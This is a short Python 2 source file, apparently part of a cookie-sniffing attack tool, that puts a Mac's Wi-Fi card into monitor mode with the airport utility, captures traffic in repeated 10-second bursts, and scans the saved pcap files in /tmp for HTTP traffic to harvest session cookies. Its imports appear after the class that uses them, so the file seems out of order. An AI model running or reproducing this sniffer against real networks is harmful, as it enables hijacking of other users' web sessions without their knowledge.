from MonsterCore import MonsterCore
class MacMonsterCore(MonsterCore):
	def __init__(self, filename, interface, arp_target,channel):
		super(MacMonsterCore, self).__init__(filename, interface, arp_target)
		self.channel = channel

	def handleMonitor(self):
		'''work around for mac os x, see https://github.com/diogomonica/py-cookieJsInjection/blob/master/OSx10.6_monitorMode.py'''
		print "[*] Starting scan on channel %s" % self.channel
		while(True):			
			p = Popen("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport " +"sniff " + self.channel, shell=True)
			time.sleep(SLEEP_TIME)
			Popen("kill -HUP %s" % p.pid, shell=True)
			scanCookies(self).start()

import os, time,sys
from subprocess import *
from scapy.all import *
import threading

SLEEP_TIME = 10 # Number of seconds to sniff (update frequency)

cookies_seen =()

class scanCookies ( threading.Thread ):
	def __init__(self, monster):
		super(scanCookies, self).__init__()
		self.monster = monster

	def run(self):
		path="/tmp/"
		dirList=os.listdir(path)
		for fileName in dirList:
			if "airportSniff" in fileName:
				try:
					sniff(offline=path+fileName,filter="tcp port 80",prn=self.monster.handlepkt)
				except NameError, e:
					print "[-] No data found on pcap: " + str(e)
					pass
				os.remove(path+fileName)
